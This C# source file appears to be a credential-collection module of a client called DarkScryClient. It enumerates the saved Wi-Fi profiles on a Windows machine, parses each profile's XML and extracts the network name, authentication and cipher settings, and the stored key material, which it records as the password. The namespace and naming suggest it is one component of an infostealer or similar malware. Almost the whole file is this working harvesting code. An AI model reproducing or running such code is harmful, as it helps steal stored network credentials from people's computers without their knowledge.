using DarkScryClient.NativeMethods;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Xml;
using static DarkScryClient.Models.WifiInfoModels;

namespace DarkScryClient.Moduls.Collection.Passwords
{
	internal class GatherWifiInfo
	{

		public static List<WifiFullInfo> GetAllProfiles()
		{
			var list = new List<WifiFullInfo>();
			
			IntPtr ptr = WifiInfo.GetWifiProfiles(out int count);
			if (ptr == IntPtr.Zero || count <= 0)
				return list;

			int structSize = Marshal.SizeOf<WifiProfileNative>();
			try
			{
				for (int i = 0; i < count; i++)
				{
					IntPtr itemPtr = IntPtr.Add(ptr, i * structSize);
					var native = Marshal.PtrToStructure<WifiProfileNative>(itemPtr);

					// Convert LPWSTR pointers to strings
					string ssidStr = native.ssid != IntPtr.Zero ? Marshal.PtrToStringUni(native.ssid) : null;
					string xmlStr = native.xml != IntPtr.Zero ? Marshal.PtrToStringUni(native.xml) : null;

					// Free those strings
					if (native.ssid != IntPtr.Zero) Marshal.FreeCoTaskMem(native.ssid);
					if (native.xml != IntPtr.Zero) Marshal.FreeCoTaskMem(native.xml);

					if (native.xml != IntPtr.Zero && native.ssid != IntPtr.Zero)
					{
						list.Add(new WifiFullInfo { SSIDName = ssidStr, xml = xmlStr });
					}
				}
			}
			finally
			{
				Marshal.FreeCoTaskMem(ptr);
			}
			return list;
		}

		public static List<BasicWifiInfo> GetBasicWifiInfo()
		{
			var profiles = GetAllProfiles();
			List<BasicWifiInfo> baisicProfiles = new List<BasicWifiInfo>();
			foreach (var profile in profiles)
			{
				var data = new BasicWifiInfo();
				var doc = new XmlDocument();
				doc.LoadXml(profile.xml);

				// 1) Create a namespace manager and register the WLAN namespace with a prefix
				var nsMgr = new XmlNamespaceManager(doc.NameTable);
				nsMgr.AddNamespace("wlan", "http://www.microsoft.com/networking/WLAN/profile/v1");

				// 2) Use that prefix in your XPath
				XmlNode nameNode = doc.SelectSingleNode("//wlan:name", nsMgr);
				XmlNode passNode = doc.SelectSingleNode("//wlan:keyMaterial", nsMgr);
				XmlNode authNode = doc.SelectSingleNode("//wlan:authentication", nsMgr);
				XmlNode encNode = doc.SelectSingleNode("//wlan:encryption", nsMgr);

				data.SSIDName = nameNode != null ? nameNode.InnerText : null;
				data.Password = passNode != null ? passNode.InnerText : null;
				data.Authentication = authNode != null ? authNode.InnerText : null;
				data.Cipher = encNode != null ? encNode.InnerText : null;

				baisicProfiles.Add(data);
			}
			return baisicProfiles;
		}
	}
}
